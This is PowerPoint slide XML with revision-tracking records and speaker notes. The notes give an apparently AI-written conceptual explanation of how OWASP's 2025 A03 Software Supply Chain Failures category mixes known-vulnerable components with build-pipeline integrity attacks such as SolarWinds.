        <pc:picChg chg="del">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T17:08:13.385" v="1372" actId="478"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1205445220" sldId="2147308298"/>
            <ac:picMk id="28" creationId="{CEA110CB-4C20-635F-FD29-E17E93D545BB}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="del">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T17:08:13.385" v="1372" actId="478"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1205445220" sldId="2147308298"/>
            <ac:picMk id="29" creationId="{ACA2E947-C6DF-F93D-E116-16CAED3D9082}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="del">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T17:08:17.091" v="1373" actId="478"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1205445220" sldId="2147308298"/>
            <ac:picMk id="30" creationId="{315D052F-72E1-0584-0342-4A64347AC1E2}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="del">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T17:08:17.091" v="1373" actId="478"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1205445220" sldId="2147308298"/>
            <ac:picMk id="31" creationId="{05498627-F8C2-7938-1D35-F4F2F79B5237}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="add mod ord">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T17:07:43.726" v="1368" actId="931"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1205445220" sldId="2147308298"/>
            <ac:picMk id="32" creationId="{754D8F15-C874-209C-DB88-C08CD62688B6}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="del">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T17:08:17.091" v="1373" actId="478"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1205445220" sldId="2147308298"/>
            <ac:picMk id="33" creationId="{9D8E748B-190C-7129-AD02-D3B7194B2561}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="add mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T17:10:03.979" v="1382" actId="1038"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1205445220" sldId="2147308298"/>
            <ac:picMk id="34" creationId="{3504AB73-C0DA-0703-6EF9-4E9684CEAF83}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="del">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T17:08:13.385" v="1372" actId="478"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1205445220" sldId="2147308298"/>
            <ac:picMk id="35" creationId="{91813449-3B4B-B0D4-A0F4-E07D4AFEE3AD}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="del">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T17:08:17.091" v="1373" actId="478"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1205445220" sldId="2147308298"/>
            <ac:picMk id="36" creationId="{ECCEB395-CCF3-9DEC-500D-6A5E78CA3DBB}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="del">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T17:08:17.091" v="1373" actId="478"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1205445220" sldId="2147308298"/>
            <ac:picMk id="37" creationId="{DC8D7C38-F59A-26E5-AF84-CBE0A2F78A38}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="del">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T17:08:17.091" v="1373" actId="478"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1205445220" sldId="2147308298"/>
            <ac:picMk id="38" creationId="{0DD666D4-1DA7-C964-82AF-31F2D51447EC}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="add mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T17:10:44.098" v="1402" actId="1035"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1205445220" sldId="2147308298"/>
            <ac:picMk id="43" creationId="{CB853F14-8BA3-5AC3-B7C4-7AF6280149D3}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="del">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T17:08:13.385" v="1372" actId="478"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1205445220" sldId="2147308298"/>
            <ac:picMk id="44" creationId="{C96CE25B-D743-58EB-8E46-C922D8344E6E}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T17:08:30.919" v="1375" actId="1076"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1205445220" sldId="2147308298"/>
            <ac:picMk id="53" creationId="{FBF671FC-DD44-195C-5D8B-35A92BE09897}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="del">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T17:05:19.353" v="1298" actId="478"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1205445220" sldId="2147308298"/>
            <ac:picMk id="58" creationId="{54EE8B7F-B244-1A5D-CB1C-5C437532E46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3"/>
            <a:ext cx="2945659" cy="495427"/>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50444" y="3"/>
            <a:ext cx="2945659" cy="495427"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0"/>
          <a:lstStyle>
            <a:lvl1pPr algn="r">
              <a:defRPr sz="1200"/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:fld id="{C2C8F004-5817-432C-BF2E-B37C61243191}" type="datetimeFigureOut">
              <a:rPr lang="fr-FR" smtClean="0"/>
              <a:t>02/06/2026</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-FR"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Espace réservé du pied de page 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="2"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="9378824"/>
            <a:ext cx="2945659" cy="495426"/>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0444" y="9378824"/>
            <a:ext cx="2945659" cy="495426"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="b"/>
          <a:lstStyle>
            <a:lvl1pPr algn="r">
              <a:defRPr sz="1200"/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:fld id="{D8B60412-7D04-4EF9-A458-892B23D842C7}" type="slidenum">
              <a:rPr lang="fr-FR" smtClean="0"/>
              <a:t>‹N°›</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-FR"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="6989651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3"/>
            <a:ext cx="2945659" cy="495427"/>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3"/>
            <a:ext cx="2945659" cy="495427"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0"/>
          <a:lstStyle>
            <a:lvl1pPr algn="r">
              <a:defRPr sz="1200"/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:fld id="{758C6438-3A3D-45EE-9E07-3B2C21B390B7}" type="datetimeFigureOut">
              <a:rPr lang="fr-FR" smtClean="0"/>
              <a:t>02/06/2026</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-FR"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Espace réservé de l'image des diapositives 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noRot="1" noChangeAspect="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg" idx="2"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="436563" y="1233488"/>
            <a:ext cx="5924550" cy="33337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51983"/>
            <a:ext cx="5438140" cy="3887986"/>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8824"/>
            <a:ext cx="2945659" cy="49542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378824"/>
            <a:ext cx="2945659" cy="495426"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="b"/>
          <a:lstStyle>
            <a:lvl1pPr algn="r">
              <a:defRPr sz="1200"/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:fld id="{2176E754-3B4B-4DA9-BBC7-071EEBBD4F8C}" type="slidenum">
              <a:rPr lang="fr-FR" smtClean="0"/>
              <a:t>‹N°›</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-FR"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3887520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Good question to dig into. Let me pull up the actual category page so I'm reasoning from what OWASP actually wrote rather than my </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>recollection.Your</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> observation is correct, and it's pointing at something real about how this category is constructed. Let me sharpen the framing a bit, because I think the distinction is even more interesting than "runtime vs. not."</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>The traditional Top 10 mold.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Almost every other category describes a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>flaw in the application you build</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> — a property of your own code or configuration that an external attacker exploits, typically against the deployed app at runtime. Broken Access Control, Injection, Auth Failures, Cryptographic Failures: the defender wrote the bug, the attacker hits the running system. The locus of both the flaw and the exploitation is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>your</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> artifact in production.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Why supply chain breaks the mold.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Most of A03 is instead about </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>trust and integrity in the process of building and delivering software</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>. The thing that gets compromised is something you didn't write, somewhere upstream of your runtime — a vendor's build (SolarWinds), a package registry and the developer/CI environment that pulls from it (Shai-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Hulud</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, and the post-install execution happens at </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>npm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> install time, i.e. build/dev, not production). The prevention guidance confirms this: it's almost entirely SBOMs, provenance, signing, separation of duties, hardening CI/CD and developer workstations, IAM — a completely different control set from "validate input" or "enforce </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>authz</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> in your handlers."</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>One refinement.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> I'd be careful with "the target is not the production runtime." In SolarWinds the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>ultimate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> target absolutely was production — ~18,000 orgs ran the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>trojaned</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Orion in their environments. The cleaner statement is that the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>injection/compromise point</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> is upstream of your code, even when the blast radius eventually reaches production. The defining feature isn't where the payload lands; it's that the compromise enters through a trusted third party or the pipeline rather than through a flaw in your own application logic.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>The deeper reason it feels heterogeneous</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> — and this is the part your "except Log4Shell" carve-out gets exactly right. The category is actually organized along </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>two different axes at once</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>By </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>origin of the code</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: the SCA / "known-vulnerable component" subset (Scenario #4 — Struts CVE-2017-5638, Log4Shell). These are classified as supply chain because the vulnerable code came from a third party, but they are exploited like any flaw in your own code: runtime RCE against the deployed app, indistinguishable in attack model from a bug you wrote yourself.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>By </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>integrity of the process</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: the true supply chain attacks (Scenarios #1–3). These are classified as supply chain because of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>where the compromise happens</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (the build/distribution/dev path), regardless of code origin.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>That's two organizing principles coexisting in one category, which is precisely why it reads as internally inconsistent. The SCA subset is there largely for historical lineage — it descended from "A9:2013 Using Components with Known Vulnerabilities," which became A06:2021 Vulnerable and Outdated Components. The 2025 edition explicitly broadens the scope "to include all supply chain failures, not just ones involving known vulnerabilities," and in doing so it absorbed the old SCA concern into a much larger integrity-focused category without the two halves fully fusing.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Two caveats so the distinction doesn't get overstated: A03 isn't the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>only</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> category that steps outside the pure-runtime model — A08:2025 Software or Data Integrity Failures is closely related (the page cross-references it) and is also about CI/CD and update-mechanism integrity, and A02 Security Misconfiguration spans build and runtime too. So it's the most pronounced example of the build/dev-targeting threat model, not a unique one. The other caveat is that even the "process integrity" scenarios eventually want to run </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>somewhere</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> — the point is just that your production runtime is the victim, not the place the vulnerability was introduced.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>So: yes, correct instinct, and the right way to express it is that A03 mixes a runtime-exploited </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>origin</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>-based concern (SCA, the exception you flagged) with a fundamentally different </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>process-integrity</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> concern that targets the toolchain and developer environment — which is genuinely unlike the rest of the list.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="fr-FR" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Espace réservé du numéro de diapositive 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{2176E754-3B4B-4DA9-BBC7-071EEBBD4F8C}" type="slidenum">
              <a:rPr lang="fr-FR" smtClean="0"/>
              <a:t>4</a:t>
            </a:fld>
            <a:endParaRPr lang="fr-FR"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="797486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Good question to dig into. Let me pull up the actual category page so I'm reasoning from what OWASP actually wrote rather than my </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>recollection.Your</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> observation is correct, and it's pointing at something real about how this category is constructed. Let me sharpen the framing a bit, because I think the distinction is even more interesting than "runtime vs. not."</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>The traditional Top 10 mold.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Almost every other category describes a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>flaw in the application you build</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> — a property of your own code or configuration that an external attacker exploits, typically against the deployed app at runtime. Broken Access Control, Injection, Auth Failures, Cryptographic Failures: the defender wrote the bug, the attacker hits the running system. The locus of both the flaw and the exploitation is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>your</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> artifact in production.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Why supply chain breaks the mold.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Most of A03 is instead about </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>trust and integrity in the process of building and delivering software</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>. The thing that gets compromised is something you didn't write, somewhere upstream of your runtime — a vendor's build (SolarWinds), a package registry and the developer/CI environment that pulls from it (Shai-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Hulud</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, and the post-install execution happens at </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>npm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> install time, i.e. build/dev, not production). The prevention guidance confirms this: it's almost entirely SBOMs, provenance, signing, separation of duties, hardening CI/CD and developer workstations, IAM — a completely different control set from "validate input" or "enforce </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>authz</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> in your handlers."</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>One refinement.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> I'd be careful with "the target is not the production runtime." In SolarWinds the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>ultimate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> target absolutely was production — ~18,000 orgs ran the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>trojaned</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Orion in their environments. The cleaner statement is that the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>injection/compromise point</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> is upstream of your code, even when the blast radius eventually reaches production. The defining feature isn't where the payload lands; it's that the compromise enters through a trusted third party or the pipeline rather than through a flaw in your own application logic.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>The deeper reason it feels heterogeneous</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> — and this is the part your "except Log4Shell" carve-out gets exactly right. The category is actually organized along </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>two different axes at once</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>By </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>origin of the code</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: the SCA / "known-vulnerable component" subset (Scenario #4 — Struts CVE-2017-5638, Log4Shell). These are classified as supply chain because the vulnerable code came from a third party, but they are exploited like any flaw in your own code: runtime RCE against the deployed app, indistinguishable in attack model from a bug you wrote yourself.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>By </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>integrity of the process</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: the true supply chain attacks (Scenarios #1–3). These are classified as supply chain because of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>where the compromise happens</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (the build/distribution/dev path), regardless of code origin.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>That's two organizing principles coexisting in one category, which is precisely why it reads as internally inconsistent. The SCA subset is there largely for historical lineage — it descended from "A9:2013 Using Components with Known Vulnerabilities," which became A06:2021 Vulnerable and Outdated Components. The 2025 edition explicitly broadens the scope "to include all supply chain failures, not just ones involving known vulnerabilities," and in doing so it absorbed the old SCA concern into a much larger integrity-focused category without the two halves fully fusing.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Two caveats so the distinction doesn't get overstated: A03 isn't the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>only</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> category that steps outside the pure-runtime model — A08:2025 Software or Data Integrity Failures is closely related (the page cross-references it) and is also about CI/CD and update-mechanism integrity, and A02 Security Misconfiguration spans build and runtime too. So it's the most pronounced example of the build/dev-targeting threat model, not a unique one. The other caveat is that even the "process integrity" scenarios eventually want to run </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>somewhere</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> — the point is just that your production runtime is the victim, not the place the vulnerability was introduced.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>So: yes, correct instinct, and the right way to express it is that A03 mixes a runtime-exploited </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>origin</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>-based concern (SCA, the exception you flagged) with a fundamentally different </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>process-integrity</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> concern that targets the toolchain and developer environment — which is genuinely unlike the rest of the list.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="fr-FR" dirty="0"/>
          </a:p>
        </p:txBody>
